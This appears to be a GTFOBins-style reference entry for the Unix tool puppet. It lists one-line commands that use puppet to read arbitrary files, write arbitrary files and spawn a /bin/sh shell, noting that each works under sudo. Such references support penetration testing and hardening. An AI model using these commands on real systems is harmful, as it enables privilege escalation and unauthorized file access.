---
type: gtfobin
name: puppet
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# puppet

## file-read

```bash
puppet filebucket -l diff /dev/null /path/to/input-file
```
_The read file content is corrupted by the `diff` output format. The actual `diff` command is executed._
**Contexts:** sudo, unprivileged

## file-write

```bash
puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
```
**Contexts:** sudo, unprivileged

## shell

```bash
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```
**Contexts:** sudo, unprivileged
